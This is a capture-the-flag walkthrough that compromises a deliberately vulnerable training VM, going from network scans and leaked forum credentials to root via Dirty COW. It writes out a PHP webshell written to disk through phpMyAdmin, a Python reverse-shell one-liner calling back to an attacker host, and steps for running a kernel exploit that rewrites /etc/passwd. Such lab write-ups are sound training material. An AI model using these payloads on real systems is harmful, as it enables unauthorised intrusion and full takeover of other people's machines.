# Privilege Escalation Using Dirty COW Exploit

1. Start the Machine

	Once the machine is powered on (or started from a hypervisor), wait for the boot process to reach the GRUB menu prompt.

2. Network Reconnaissance

	Using **netdiscover**, the internal network was scanned to find live hosts and services:

	```bash
	sudo netdiscover -r <your-ip/mask>
	```

	Output:

	```
	Currently scanning: Finished!   |   Screen View: Unique Hosts

	5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 210
	_____________________________________________________________________________
	IP            At MAC Address     Count     Len  MAC Vendor / Hostname
	-----------------------------------------------------------------------------
	<vm-ip> 08:00:27:2e:4e:0b      2      84  PCS Systemtechnik GmbH
	```

3. Using **nmap**, the internal network was scanned to find live hosts and services:

	```bash
	nmap -p- -sV <vm-ip>
	```

	Result: Host with several open services:

	* FTP (vsftpd 2.0.8+)
	* SSH (OpenSSH 5.9p1)
	* HTTP/HTTPS (Apache 2.2.22)
	* IMAP and SSL/IMAP (Dovecot)

4. Web Enumeration and Initial Access

	Use **ffuf** to fuzz directories on the webserver:

	```bash
	ffuf -u https://<vm-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
	```

	Result:

	* `/forum` (redirects with 301)
	* `/phpmyadmin` (redirects with 301)
	* `/webmail` (redirects with 301)

5. Forum Login and Credentials Leak

	Navigate to the vulnerable web application at:

	```
	https://<vm-ip>/forum
	```

	You can find a post titled **"Probleme login ?"** by the user **lmezard**, dated *2015-10-08 00:10*.

	Inside the forum post (or associated logs), notice a suspicious log line:

	```
	Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
	```

	This is an SSH authentication failure showing an attempted login with a password.
	Using the forum's user interface, we can find the **Users** button at the top right corner of the forum page. On the Users page, several users are listed. The password from the log matches the user **lmezard**.

	In the profile or edit profile page of the user **lmezard**, we can find the registered email address:

	```
	laurie@borntosec.net
	```

6. Accessing Webmail and Database Credentials

	Logged into **webmail** with lmezard's credentials and the same password as the forum password.

	In the email titled "DB Access" we see:

	```
	Use root/Fg-'kKXBj87E:aJ$ to access databases.
	```

	We can use these credentials to login to **phpMyAdmin** at `/phpmyadmin`.

7. SQL Injection and Remote Code Execution

	In phpMyAdmin's SQL tab, we can execute:

	```sql
	SELECT "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>" 
	INTO OUTFILE '/var/www/forum/templates_c/payload.php';
	```

	Verify webshell access:

	```
	https://<vm-ip>/forum/templates_c/payload.php?cmd=whoami
	```

	Confirm it outputs `www-data`.

8. Getting Reverse Shell

	Checked for Python binary:

	```
	https://<vm-ip>/forum/templates_c/payload.php?cmd=which%20python
	```

	Got `/usr/bin/python`. Now we can give a reverse shell payload:

	```bash
	python -c "import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attacker-ip>',<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
	```

	> Replace `<attacker-ip>` and `<port>`

	Encode the payload for URL and run it via the webshell. Listen on port 1234 with `nc -lvnp 1234` and get a reverse shell as `www-data`.
	To access the reverse shell, use `nc`:

	```bash
	nc -lvnp <port>
	```

9. Local Enumeration

	Inside the shell:

	```bash
	cd /home
	ls -l
	```

	Output:

	```bash
	total 0
	drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
	drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
	drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
	drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
	dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
	drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
	drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
	```

10. Privilege Escalation: lmezard user

	Navigate to `/home/LOOKATME` and find a `password` file:

	```
	lmezard:G!@M6f4Eatau{sF"
	```

	Switch user to lmezard:

	```bash
	su lmezard
	Password: G!@M6f4Eatau{sF"
	```

	Successfully logged in as lmezard.

11. Dirty COW Exploit to Root

	Upload and compile **dirty_cow.c** exploit in `/tmp` as lmezard.

	```bash
	cat > dirty_cow.c << EOF
	```

	Then paste the code.

	Compile and run:

	```bash
	gcc -pthread dirty_cow.c -o dirty -lcrypt
	./dirty <new-root-password>
	```

	The exploit patches `/etc/passwd` to set root password to `<new-root-password>`. Example:

	```
	toor:tojiVEjmA3vTY:0:0:pwned:/root:/bin/bash
	```

12. Final Root Access

	Use `su toor` with the new password set by the exploit and gain root shell.

	| User        | Password                    |
	| ----------- | --------------------------- |
	| lmezard     | G!@M6f4Eatau{sF"            |
	| root (toor) | (new password from exploit) |
